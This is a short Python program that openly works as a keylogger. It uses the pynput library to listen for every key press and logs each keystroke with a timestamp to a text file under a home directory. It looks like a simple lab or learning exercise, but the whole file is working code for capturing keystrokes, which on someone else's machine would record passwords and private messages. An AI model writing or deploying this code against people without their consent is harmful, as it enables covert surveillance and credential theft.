#before running this program please ensure that you have downloaded all the dependencies for this program

import logging
from pynput.keyboard import Key, Listener

log_dir = "/home/sjcet/"

logging.basicConfig(filename=(log_dir + "key_logger.txt"),
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
